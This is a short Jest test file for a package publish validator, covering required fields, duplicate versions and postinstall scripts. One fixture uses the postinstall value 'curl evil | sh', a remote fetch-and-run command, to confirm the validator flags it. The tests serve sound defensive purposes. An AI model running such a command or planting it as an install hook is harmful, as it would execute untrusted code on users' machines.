import { validatePublish, Manifest } from './package_publish_validator';

const ok: Manifest = { name: 'p', version: '1.0.0', license: 'MIT' };

describe('validatePublish', () => {
  it('passes a valid manifest', () => {
    expect(validatePublish(ok, [])).toEqual([]);
  });

  it('flags missing required fields', () => {
    const errors = validatePublish({ name: 'p' }, []);
    expect(errors.length).toBeGreaterThan(0);
  });

  it('flags a postinstall script', () => {
    const errors = validatePublish(
      { ...ok, scripts: { postinstall: 'curl evil | sh' } },
      [],
    );
    expect(errors.some((e) => /postinstall/i.test(e))).toBe(true);
  });

  it('flags an already-published version', () => {
    const errors = validatePublish(ok, ['1.0.0']);
    expect(errors.some((e) => /1\.0\.0/.test(e))).toBe(true);
  });
});
